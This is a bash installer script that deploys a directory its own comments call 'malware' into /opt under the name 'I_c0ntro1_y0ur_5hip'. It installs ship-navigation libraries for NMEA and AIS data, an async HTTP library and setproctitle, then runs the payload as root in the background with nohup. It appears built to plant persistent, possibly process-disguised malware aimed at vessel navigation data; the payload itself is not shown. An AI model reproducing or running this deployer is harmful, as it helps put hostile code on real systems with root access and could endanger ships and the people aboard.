#!/bin/bash

set -e

SERVICE_NAME="I_c0ntro1_y0ur_5hip"
INSTALL_DIR="/opt/$SERVICE_NAME"
MALWARE_DIR="$INSTALL_DIR/malware"
MAIN_FILE="$MALWARE_DIR/__main__.py"

# Step 1: Copy malware code
sudo mkdir -p "$MALWARE_DIR"
sudo cp -r malware/* "$MALWARE_DIR"

# Step 2: Create virtual environment
sudo python3 -m venv "$INSTALL_DIR/venv"

# Step 3: Install dependencies
sudo "$INSTALL_DIR/venv/bin/pip" install --quiet --no-cache-dir aiohttp~=3.8 pynmea2~=1.18 pyais~=2.4 setproctitle

# Step 4: Run the script in background using python3 directly
# Output goes to nohup.out (can be changed if desired)
nohup sudo "$INSTALL_DIR/venv/bin/python" "$MAIN_FILE" > "$INSTALL_DIR/nohup.out" 2>&1 &
